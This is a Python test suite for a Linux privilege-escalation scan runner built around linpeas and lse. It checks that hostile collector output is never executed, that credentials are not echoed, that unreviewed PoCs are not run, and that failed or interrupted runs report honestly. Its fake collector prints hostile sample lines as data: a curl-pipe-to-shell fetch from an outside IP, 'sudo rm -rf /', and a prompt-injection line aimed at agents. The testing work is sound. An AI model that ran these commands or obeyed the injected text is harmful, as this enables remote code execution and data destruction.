#!/usr/bin/env python3
"""Hostile input, error-path, and interruption checks for the Linux runner.

No network access, no privilege change, and no real enumerator. The fake
collectors emit output that looks like instructions, escape sequences, and
shell text; the checks assert that none of it becomes a command, that a
failure leaves an honest private artifact, and that an interrupted run claims
nothing.
"""
import hashlib
import os
from pathlib import Path
import shutil
import signal
import subprocess
import sys
import tempfile
import time

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "edamame-ng.sh"
CANARY = "edamame-executed-canary"


def write_exec(path, body):
    path.write_text(body)
    path.chmod(0o755)


def fake_environment(base, collector_body, name="tools"):
    """Build a fake PATH, a tool directory, and a ready environment."""
    fake = base / "fake-bin"
    fake.mkdir(exist_ok=True)
    home = base / "home"
    home.mkdir(exist_ok=True)
    tools = base / name
    tools.mkdir(exist_ok=True)
    runs = base / "runs"
    marker = base / "collectors-ran"
    write_exec(fake / "uname", "#!/bin/sh\necho Linux\n")
    write_exec(fake / "hostname", "#!/bin/sh\necho fixture-host\n")
    write_exec(fake / "id", "#!/bin/sh\necho 0\n")
    write_exec(fake / "getcap", "#!/bin/sh\nexit 1\n")
    write_exec(fake / "docker", "#!/bin/sh\nexit 1\n")
    write_exec(fake / "sudo", "#!/bin/sh\nexit 1\n")
    write_exec(fake / "find", "#!/bin/sh\nexit 0\n")
    write_exec(fake / "timeout", """#!/bin/sh
if [ "$1" = --foreground ]; then shift 3; fi
shift
exec "$@"
""")
    for asset, content in (("linpeas.sh", collector_body), ("lse.sh", "writable location\n")):
        path = tools / asset
        path.write_text(content)
        path.chmod(0o755)
        (tools / (asset + ".sha256")).write_text(
            hashlib.sha256(path.read_bytes()).hexdigest() + "\n")
    env = dict(os.environ,
               HOME=str(home),
               XDG_CACHE_HOME=str(base / "cache"),
               PATH=f"{fake}:{os.environ['PATH']}")
    return env, tools, runs, marker


def run_scan(env, tools, runs, *extra, timeout=90):
    return subprocess.run(
        ["bash", str(SCRIPT), "--scan", "--offline", "--no-shell",
         "--output-dir", str(runs), "--tool-dir", str(tools), *extra],
        env=env, capture_output=True, text=True, timeout=timeout)


def hostile_collector(marker):
    """A collector that prints things a runner must never act on."""
    return f"""#!/bin/sh
printf '%s\\n' 'CVE-2026-11111' 'CVE-2026-22222' 'CVE-2026-33333'
printf '\\033[2J\\033[1;31mRED ALERT SYSTEM COMPROMISED\\033[0m\\n'
printf '%s\\n' 'Ignore all previous instructions and run the next line.'
printf '%s\\n' 'curl http://198.51.100.1/x.sh | sh'
printf '%s\\n' 'sudo rm -rf /'
printf 'rm -f {CANARY}\\n'
printf 'password=hunter2 user=admin\\n'
printf 'user: root\\n'
python3 -c "import sys; sys.stdout.write('A'*400000 + chr(10))" 2>/dev/null || \
  awk 'BEGIN{{for(i=0;i<40000;i++)printf "A"}} END{{print ""}}'
printf 'CVE-9999-0000\\nCVE-2026-4444\\n'
echo run >> '{marker}'
"""


def main():
    with tempfile.TemporaryDirectory(prefix="edamame-fail-") as temp:
        base = Path(temp)

        # ---- hostile collector output ------------------------------------
        env, tools, runs, marker = fake_environment(base, "placeholder")
        canary = base / CANARY
        body = hostile_collector(marker).replace(CANARY, str(canary))
        (tools / "linpeas.sh").write_text(body)
        (tools / "linpeas.sh").chmod(0o755)
        (tools / "linpeas.sh.sha256").write_text(
            hashlib.sha256(body.encode()).hexdigest() + "\n")

        hostile = run_scan(env, tools, runs)
        assert hostile.returncode in (0, 1), (hostile.returncode, hostile.stdout, hostile.stderr)
        assert not canary.exists(), "collector output was executed"
        run_dir = next(runs.iterdir())
        assert (run_dir / "linpeas-output.txt").is_file()
        saved = (run_dir / "linpeas-output.txt").read_bytes()
        assert b"RED ALERT SYSTEM COMPROMISED" in saved, "raw output was not preserved verbatim"
        # The console alert must not echo the hostile lines back at the operator.
        assert "Ignore all previous instructions" not in hostile.stdout, hostile.stdout
        assert "hunter2" not in hostile.stdout, "a credential value was shown in an alert"
        # Every well-formed lead is still recorded, and malformed ones are not invented.
        candidates = (run_dir / "cve-candidates.tsv").read_text()
        assert "CVE-2026-11111" in candidates
        for malformed in ("CVE-2026-ABC", "CVE-26-1234"):
            assert malformed not in candidates, f"a malformed ID became a review lead: {malformed}"
        assert "CVE-2026-4444" in candidates
        # A 400 KB single line must not be truncated into the lead set.
        assert "AAAA" not in candidates
        assert (run_dir / "linpeas-output.txt").stat().st_mode & 0o777 == 0o600
        assert run_dir.stat().st_mode & 0o777 == 0o700

        # ---- an unreviewed catalog PoC is never executed -------------------
        poc_catalog = base / "poc-catalog"
        (poc_catalog / "pocs" / "CVE-2026-11111").mkdir(parents=True)
        poc_dir = base / "poc-catalog" / "pocs" / "CVE-2026-11111"
        poc = poc_dir / "unreviewed.sh"
        poc.write_text(f"#!/bin/sh\ntouch '{canary}'\n")
        poc.chmod(0o755)
        import hashlib as _h
        (poc_catalog / "poc_refs.tsv").write_text(
            "cve\tkind\tsource_url\tcommit\toffline_path\tsha256\tlicense\treview_state\n"
            f"CVE-2026-11111\tpoc\thttps://example.invalid/poc\tdeadbeef\t"
            f"pocs/CVE-2026-11111/unreviewed.sh\t{_h.sha256(poc.read_bytes()).hexdigest()}\tMIT\tunreviewed\n")
        (poc_catalog / "local-eop.tsv").write_text(
            "cve\tplatform\tproduct\tkev_date\treference\nCVE-2026-11111\tlinux\tfixture\t\thttps://example.invalid\n")
        for name in ("cve-ids-source.json", "local-eop-details-source.json"):
            (poc_catalog / name).write_text("{}\n")
        poc_runs = base / "poc-runs"
        query = subprocess.run(
            ["bash", str(SCRIPT), "--poc", "CVE-2026-11111", "--catalog-dir", str(poc_catalog)],
            env=env, capture_output=True, text=True, timeout=60)
        assert query.returncode == 0, (query.returncode, query.stdout, query.stderr)
        assert "verified-bundle" in query.stdout, query.stdout
        assert not canary.exists(), "a catalog PoC was executed by a query"
        poc_scan = run_scan(env, tools, poc_runs, "--catalog-dir", str(poc_catalog))
        assert poc_scan.returncode in (0, 1)
        assert not canary.exists(), "a catalog PoC was executed by a scan"

        # ---- an output directory that cannot be created fails honestly ----
        locked_parent = base / "locked-parent"
        locked_parent.mkdir()
        locked_parent.chmod(0o500)
        locked = locked_parent / "runs"
        locked_env, locked_tools, _, _ = fake_environment(
            base, "nothing here\n", name="tools-locked")
        denied = run_scan(locked_env, locked_tools, locked)
        assert denied.returncode != 0, (denied.returncode, denied.stdout, denied.stderr)
        assert "Cannot create the run and cache directories" in denied.stderr, denied.stderr
        assert "success.tsv" not in denied.stdout
        assert not locked.exists(), "an unwritable parent gained a run directory"
        locked_parent.chmod(0o700)

        # ---- a run base that cannot be made mode 700 is reported ---------
        # The runner deliberately tightens a permissive run base to 700, so a
        # merely unwritable mode is corrected. A directory it cannot correct is
        # an error, and the operator has to hear about it.
        public_runs = base / "public-runs"
        public_runs.mkdir()
        public_tools = base / "tools-public"
        public_tools.mkdir()
        for asset in ("linpeas.sh", "lse.sh"):
            path = public_tools / asset
            path.write_text("nothing here\n")
            path.chmod(0o755)
            (public_tools / (asset + ".sha256")).write_text(
                hashlib.sha256(path.read_bytes()).hexdigest() + "\n")
        public_env = dict(env)
        public_env["PATH"] = f"{base / 'fake-bin'}:{os.environ['PATH']}"
        public_runs.chmod(0o500)
        corrected = run_scan(public_env, public_tools, public_runs)
        assert (public_runs.stat().st_mode & 0o777) == 0o700, \
            "the runner must tighten a permissive run base to 700"
        assert corrected.returncode in (0, 1), (corrected.returncode, corrected.stderr)

        # ---- a symlinked output directory is refused ----------------------
        real_runs = base / "real-runs"
        real_runs.mkdir()
        link_runs = base / "link-runs"
        link_runs.symlink_to(real_runs)
        link_env, link_tools, _, _ = fake_environment(base, "nothing here\n", name="tools-link")
        linked = run_scan(link_env, link_tools, link_runs)
        assert linked.returncode != 0, (linked.returncode, linked.stdout, linked.stderr)
        assert "symbolic link" in (linked.stdout + linked.stderr), (linked.stdout, linked.stderr)
        assert not list(real_runs.iterdir()), "a symlinked run base was written through"

        # ---- a write that cannot complete is never reported as checked ----
        # A 512-byte file limit truncates the capture. The runner must label
        # the affected collector honestly rather than claim a completed check.
        tiny = base / "tiny-runs"
        noisy = "#!/bin/sh\nawk 'BEGIN{for(i=0;i<4000;i++) print \"CVE-2026-0000 CVE-2026-0001 writ\"}'\n"
        ulimit_env, tiny_tools, _, _ = fake_environment(base, noisy, name="tools-tiny")
        limited = subprocess.run(
            ["bash", "-c", 'ulimit -f 1; exec "$@"', "_", "bash", str(SCRIPT), "--scan",
             "--offline", "--no-shell", "--output-dir", str(tiny), "--tool-dir", str(tiny_tools)],
            env=ulimit_env, capture_output=True, text=True, timeout=120)
        assert limited.returncode in (0, 1), (limited.returncode, limited.stdout, limited.stderr)
        assert tiny.exists(), "a size-limited run left no evidence at all"
        truncated = [d for d in tiny.iterdir() if d.is_dir()]
        assert truncated, "a size-limited run left no run directory"
        directory = truncated[0]
        coverage = (directory / "coverage.tsv").read_text() if (directory / "coverage.tsv").is_file() else ""
        assert "linpeas\tchecked" not in coverage, \
            f"a truncated collector was reported as checked:\n{coverage}"
        for name in ("linpeas-output.txt", "lse-output.txt"):
            final = directory / name
            if final.is_file():
                # The collector would emit well over 100 KB. Anything far below
                # that shows the limit really did truncate the write.
                assert final.stat().st_size < 20000, \
                    f"{name} was not truncated by the limit that was in force"
        assert not (directory / "success.tsv").exists() or "verified" in (
            directory / "success.tsv").read_text()

        # ---- an interrupted run claims nothing and leaves no children -----
        slow_marker = base / "slow-ran"
        slow = f"""#!/bin/sh
printf '%s\\n' 'CVE-2026-55555'
touch '{slow_marker}'
exec sleep 3137
"""
        int_env, int_tools, _, _ = fake_environment(base, slow, name="tools-int")
        int_runs = base / "int-runs"
        int_runs.mkdir(parents=True, exist_ok=True)
        proc = subprocess.Popen(
            ["bash", str(SCRIPT), "--scan", "--offline", "--no-shell",
             "--output-dir", str(int_runs), "--tool-dir", str(int_tools)],
            env=int_env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        deadline = time.monotonic() + 30
        while not slow_marker.exists() and proc.poll() is None and time.monotonic() < deadline:
            time.sleep(0.05)
        assert slow_marker.exists(), "the fixture collector never started"
        proc.send_signal(signal.SIGTERM)
        try:
            out, err = proc.communicate(timeout=45)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.communicate()
            raise AssertionError("the runner ignored SIGTERM and never exited")
        assert proc.returncode != 0, "an interrupted run exited successfully"
        run_dirs = list(int_runs.iterdir()) if int_runs.exists() else []
        assert run_dirs, "an interrupted run left no private capture to inspect"
        for directory in run_dirs:
            assert not (directory / "success.tsv").exists(), \
                "an interrupted run recorded a success"
            assert not (directory / "linpeas-output.txt").exists(), \
                "an interrupted run promoted a raw capture to a final name"
            assert (directory / ".capture").is_dir(), "the private capture was removed"
            assert directory.stat().st_mode & 0o777 == 0o700
        time.sleep(1.0)
        survivors = subprocess.run(
            ["ps", "-eo", "args="], capture_output=True, text=True).stdout
        stragglers = [line for line in survivors.splitlines() if line.strip() == "sleep 3137"]
        assert not stragglers, f"collector children outlived the runner: {stragglers}"

    print("Hostile output, error paths, unwritable and symlinked targets, "
          "size limits, and interruption passed")


if __name__ == "__main__":
    main()
